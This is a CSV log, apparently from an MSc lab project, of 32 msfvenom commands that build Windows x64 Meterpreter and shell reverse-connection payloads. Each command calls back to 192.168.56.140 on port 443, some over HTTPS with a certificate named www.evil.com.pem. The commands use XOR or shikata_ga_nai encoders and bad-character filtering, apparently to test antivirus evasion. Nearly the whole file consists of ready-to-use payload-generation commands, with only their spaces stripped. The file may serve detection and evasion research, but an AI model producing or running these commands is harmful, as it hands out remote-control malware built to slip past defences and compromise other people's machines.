No,Payload_Type,Filename,Result,Encoder,Remark,Command+
1,windows/x64/meterpreter/reverse_tcp,payload_1.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter/reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-b\x00\x0a\x0d\x20\xf4\x41
2,windows/x64/meterpreter_reverse_tcp,payload_2.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter_reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-b\x00\x0a\x0d\x20\xf4\x41
3,windows/x64/meterpreter_reverse_http,payload_3.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter_reverse_httpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-b\x00\x0a\x0d\x20\xf4\x41
4,windows/x64/meterpreter_reverse_https,payload_4.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter_reverse_httpsLHOST=192.168.56.140LPORT=443EXITFUNC=threadHandlerSSLCert=/home/kali/Desktop/msc_project/www.evil.com.pemStagerVerifySSLCert=true-fcsharp-b\x00\x0a\x0d\x20\xf4\x41
5,windows/x64/meterpreter/reverse_http,payload_5.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter/reverse_httpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-b\x00\x0a\x0d\x20\xf4\x41
6,windows/x64/meterpreter/reverse_https,payload_6.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter/reverse_httpsLHOST=192.168.56.140LPORT=443EXITFUNC=threadHandlerSSLCert=/home/kali/Desktop/msc_project/www.evil.com.pemStagerVerifySSLCert=true-fcsharp-b\x00\x0a\x0d\x20\xf4\x41
7,windows/x64/shell/reverse_tcp,payload_7.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/shell/reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-b\x00\x0a\x0d\x20\xf4\x41
8,windows/x64/shell_reverse_tcp,payload_8.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/shell_reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-b\x00\x0a\x0d\x20\xf4\x41
9,windows/x64/meterpreter/reverse_tcp,payload_9.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter/reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-ex86/shikata_ga_nai-i5
10,windows/x64/meterpreter_reverse_tcp,payload_10.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter_reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-ex86/shikata_ga_nai-i5
11,windows/x64/meterpreter_reverse_http,payload_11.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter_reverse_httpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-ex86/shikata_ga_nai-i5
12,windows/x64/meterpreter_reverse_https,payload_12.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter_reverse_httpsLHOST=192.168.56.140LPORT=443EXITFUNC=threadHandlerSSLCert=/home/kali/Desktop/msc_project/www.evil.com.pemStagerVerifySSLCert=true-fcsharp-ex86/shikata_ga_nai-i5
13,windows/x64/meterpreter/reverse_http,payload_13.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter/reverse_httpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-ex86/shikata_ga_nai-i5
14,windows/x64/meterpreter/reverse_https,payload_14.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter/reverse_httpsLHOST=192.168.56.140LPORT=443EXITFUNC=threadHandlerSSLCert=/home/kali/Desktop/msc_project/www.evil.com.pemStagerVerifySSLCert=true-fcsharp-ex86/shikata_ga_nai-i5
15,windows/x64/shell/reverse_tcp,payload_15.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/shell/reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-ex86/shikata_ga_nai-i5
16,windows/x64/shell_reverse_tcp,payload_16.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/shell_reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fcsharp-ex86/shikata_ga_nai-i5
17,windows/x64/meterpreter/reverse_tcp,/home/kali/Desktop/msc_project/temp/payload_17.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter/reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-b\x00\x0a\x0d\x20\xf4\x41
18,windows/x64/meterpreter_reverse_tcp,/home/kali/Desktop/msc_project/temp/payload_18.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter_reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-b\x00\x0a\x0d\x20\xf4\x41
19,windows/x64/meterpreter_reverse_http,/home/kali/Desktop/msc_project/temp/payload_19.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter_reverse_httpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-b\x00\x0a\x0d\x20\xf4\x41
20,windows/x64/meterpreter_reverse_https,/home/kali/Desktop/msc_project/temp/payload_20.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter_reverse_httpsLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-b\x00\x0a\x0d\x20\xf4\x41
21,windows/x64/meterpreter/reverse_http,/home/kali/Desktop/msc_project/temp/payload_21.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter/reverse_httpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-b\x00\x0a\x0d\x20\xf4\x41
22,windows/x64/meterpreter/reverse_https,/home/kali/Desktop/msc_project/temp/payload_22.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/meterpreter/reverse_httpsLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-b\x00\x0a\x0d\x20\xf4\x41
23,windows/x64/shell/reverse_tcp,/home/kali/Desktop/msc_project/temp/payload_23.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/shell/reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-b\x00\x0a\x0d\x20\xf4\x41
24,windows/x64/shell_reverse_tcp,/home/kali/Desktop/msc_project/temp/payload_24.exe,0,XOR_x64,NA,msfvenom-pwindows/x64/shell_reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-b\x00\x0a\x0d\x20\xf4\x41
25,windows/x64/meterpreter/reverse_tcp,/home/kali/Desktop/msc_project/temp/payload_25.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter/reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-ex86/shikata_ga_nai-i5
26,windows/x64/meterpreter_reverse_tcp,/home/kali/Desktop/msc_project/temp/payload_26.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter_reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-ex86/shikata_ga_nai-i5
27,windows/x64/meterpreter_reverse_http,/home/kali/Desktop/msc_project/temp/payload_27.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter_reverse_httpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-ex86/shikata_ga_nai-i5
28,windows/x64/meterpreter_reverse_https,/home/kali/Desktop/msc_project/temp/payload_28.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter_reverse_httpsLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-ex86/shikata_ga_nai-i5
29,windows/x64/meterpreter/reverse_http,/home/kali/Desktop/msc_project/temp/payload_29.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter/reverse_httpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-ex86/shikata_ga_nai-i5
30,windows/x64/meterpreter/reverse_https,/home/kali/Desktop/msc_project/temp/payload_30.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/meterpreter/reverse_httpsLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-ex86/shikata_ga_nai-i5
31,windows/x64/shell/reverse_tcp,/home/kali/Desktop/msc_project/temp/payload_31.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/shell/reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-ex86/shikata_ga_nai-i5
32,windows/x64/shell_reverse_tcp,/home/kali/Desktop/msc_project/temp/payload_32.exe,0,x86/shikata_ga_nai,NA,msfvenom-pwindows/x64/shell_reverse_tcpLHOST=192.168.56.140LPORT=443EXITFUNC=thread-fc-ex86/shikata_ga_nai-i5
